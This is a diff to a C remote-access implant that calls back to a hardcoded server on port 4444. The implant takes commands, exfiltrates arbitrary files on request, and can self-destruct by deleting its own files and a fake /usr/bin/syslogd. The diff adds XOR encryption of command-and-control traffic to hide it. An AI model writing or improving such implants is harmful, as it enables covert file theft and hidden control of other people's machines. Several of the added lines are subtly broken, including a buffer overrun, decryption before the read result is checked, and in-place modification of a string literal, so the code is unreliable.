@@ -11,8 +11,14 @@
 #define SERVER_IP "192.168.65.254"
 #define SERVER_PORT 4444
 #define BUF_SIZE 2048
-
+#define XOR_KEY 0x55
 int sock;
+
+void xor_encrypt_decrypt(char *data, int len, char key) {
+    for (int i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
 
 void trim_newline(char *s) {
     size_t len = strlen(s);
@@ -22,7 +28,10 @@ void trim_newline(char *s) {
 
 // Sending response with flushing
 int send_response(const char *msg) {
-    int bytes_sent = send(sock, msg, strlen(msg), 0);
+    char buffer[BUF_SIZE];
+    strncpy(buffer, msg, BUF_SIZE);
+    xor_encrypt_decrypt(buffer, strlen(buffer), XOR_KEY); // Encrypt before sending
+    int bytes_sent = send(sock, buffer, strlen(buffer), 0);
     fsync(sock); // Ensure data is sent immediately
     if (bytes_sent < 0) {
         perror("[-] Error sending response");
@@ -58,17 +67,17 @@ int send_file(const char *file_path) {
     char buf[BUF_SIZE];
     size_t n;
     while ((n = fread(buf, 1, BUF_SIZE, fp)) > 0) {
-        if (send_response(buf) < 0) {
-            perror("[-] Send error");
-            break;
-        }
+        buf[n] = '\0';  // Null-terminate the chunk
+        send_response(buf);  // Use send_response for consistent encryption
     }
     fclose(fp);
 
-    const char *end_msg = "\n[*] END\n";
-    send_response(end_msg);
+    const char *end_msg = "[*] END\n";
+    send_response(end_msg);  // Properly send the end message
     return 0;
 }
+
+
 
 int main() {
     struct sockaddr_in server;
@@ -92,6 +101,8 @@ int main() {
     while (1) {
         memset(buffer, 0, BUF_SIZE);
         int n = read(sock, buffer, BUF_SIZE - 1);
+        xor_encrypt_decrypt(buffer, n, 0x55);  // Decrypt the received command
+
         if (n <= 0) break;
         trim_newline(buffer);
 
@@ -107,7 +118,9 @@ int main() {
             remove("/tmp/i");
             remove("/tmp/exfil");
             remove("/usr/bin/syslogd");
-            send(sock, "Implant self-destructed and traces wiped\n", 41, 0);
+            char msg[] = "Implant self-destructed and traces wiped\n";
+            xor_encrypt_decrypt(msg, strlen(msg), XOR_KEY);  // Encrypt the message
+            send(sock, msg, strlen(msg), 0);
             shutdown(sock, SHUT_WR);
             close(sock);  
             exit(0);
@@ -122,8 +135,27 @@ int main() {
 
         if (strncmp(buffer, "exfil ", 6) == 0) {
             char *file = buffer + 6;
-            if (send_file(file) < 0)
-                send_response("[-] File exfiltration failed\n");
+            char msg[BUF_SIZE];
+        
+            // Open the file
+            int fd = open(file, O_RDONLY);
+            if (fd < 0) {
+                const char *err = "[-] Failed to open file\n";
+                send_file(err);
+                continue;
+            }
+        
+            // Read and send the file contents
+            ssize_t n;
+            while ((n = read(fd, msg, BUF_SIZE)) > 0) {
+                xor_encrypt_decrypt(msg, n, XOR_KEY);  // Encrypt file data
+                send(sock, msg, n, 0);  // Send encrypted data
+            }
+            close(fd);
+        
+            const char *end_msg = "[*] END\n";
+            xor_encrypt_decrypt((char *)end_msg, strlen(end_msg), XOR_KEY);
+            send(sock, end_msg, strlen(end_msg), 0);
             continue;
         }
 
